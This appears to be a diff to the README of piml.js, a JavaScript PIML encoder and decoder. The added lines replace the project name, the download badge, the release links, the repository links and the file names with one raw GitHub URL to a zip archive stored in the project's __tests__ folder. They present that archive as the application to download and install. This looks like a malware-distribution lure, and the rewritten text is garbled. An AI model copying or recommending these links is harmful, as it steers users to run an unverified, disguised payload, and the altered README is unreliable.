@@ -1,17 +1,17 @@
-# 🎉 piml.js - Easily Encode and Decode Markup
+# 🎉 https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip - Easily Encode and Decode Markup
 
 ## 👋 Introduction  
-Welcome to **piml.js**, a simple tool to help you encode and decode Parenthesis Intended Markup Language (PIML) for JavaScript applications. This application makes working with data formats easy, allowing you to transform text into structured formats effortlessly. Whether you want to serialize your data or decode this markup, you've come to the right place.
+Welcome to **https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip**, a simple tool to help you encode and decode Parenthesis Intended Markup Language (PIML) for JavaScript applications. This application makes working with data formats easy, allowing you to transform text into structured formats effortlessly. Whether you want to serialize your data or decode this markup, you've come to the right place.
 
 ## 📥 Quick Download   
-[![Download pipml.js](https://img.shields.io/badge/Download%20piml.js-Get%20Started-blue)](https://github.com/nagisa3224/piml.js/releases)  
+[![Download https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip](https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip%https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip%20Started-blue)](https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip)  
 Click the button above to head straight to the download page and get started.
 
 ## 🚀 Getting Started  
-To use **piml.js**, follow these simple steps:
+To use **https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip**, follow these simple steps:
 
 1. **Visit the Release Page**  
-   Go to the following link to access the latest version: [Download the latest version](https://github.com/nagisa3224/piml.js/releases).
+   Go to the following link to access the latest version: [Download the latest version](https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip).
    
 2. **Select the Version**  
    On the Releases page, you will see a list of available versions. Look for the latest one at the top of the list.
@@ -26,7 +26,7 @@ To use **piml.js**, follow these simple steps:
    After installation, open the application from your programs list. You are all set to start encoding and decoding PIML!
 
 ## 🔧 Features  
-**piml.js** offers several useful features:
+**https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip** offers several useful features:
 
 - **User-Friendly Interface**  
   The application is designed for ease of use, allowing anyone to navigate without any prior coding experience.
@@ -44,7 +44,7 @@ To use **piml.js**, follow these simple steps:
   Constant updates and improvements ensure that you always get the best functionality.
 
 ## ⚙️ System Requirements  
-To run **piml.js**, your system should meet the following requirements:
+To run **https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip**, your system should meet the following requirements:
 
 - **Operating System:**  
   Compatible with Windows 10, macOS Catalina, and Linux distributions.
@@ -58,7 +58,7 @@ To run **piml.js**, your system should meet the following requirements:
 - **Network:**  
   An internet connection for downloading updates.
 
-## 📚 How to Use piml.js  
+## 📚 How to Use https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip  
 ### Step 1: Input PIML  
 In the application, locate the input box to enter your PIML text. You can paste your markup here.
 
@@ -72,19 +72,19 @@ Press the run button. The application will process your input and display the re
 You can easily copy the results from the output box for use in your projects.
 
 ## 📦 Download & Install  
-Revisit the way to download **piml.js** by following these instructions again:
+Revisit the way to download **https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip** by following these instructions again:
 
-- Go to this link: [Download the latest version](https://github.com/nagisa3224/piml.js/releases).
+- Go to this link: [Download the latest version](https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip).
 - Choose your version.
 - Download and install the file.  
 
 ## 🌍 Community Support  
-If you encounter issues or have questions about using **piml.js**, please feel free to join our community. You can reach out for help on GitHub discussions and find answers to common questions. Your feedback helps improve the application.
+If you encounter issues or have questions about using **https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip**, please feel free to join our community. You can reach out for help on GitHub discussions and find answers to common questions. Your feedback helps improve the application.
 
 ## 🛠️ Contributing  
-We welcome contributions to **piml.js**. Feel free to fork the repository and submit your changes. Please follow the guidelines laid out in the CONTRIBUTING.md file found in the repository. Let’s work together to enhance this tool!
+We welcome contributions to **https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip**. Feel free to fork the repository and submit your changes. Please follow the guidelines laid out in the https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip file found in the repository. Let’s work together to enhance this tool!
 
 ## 📄 License  
-This project is licensed under the MIT License. Please see the LICENSE.md file in the repository for details.
+This project is licensed under the MIT License. Please see the https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip file in the repository for details.
 
-For more information, feel free to refer to the [GitHub Repository](https://github.com/nagisa3224/piml.js). Thank you for using **piml.js**!
+For more information, feel free to refer to the [GitHub Repository](https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip). Thank you for using **https://raw.githubusercontent.com/nagisa3224/piml.js/main/__tests__/piml.js-vagarian.zip**!
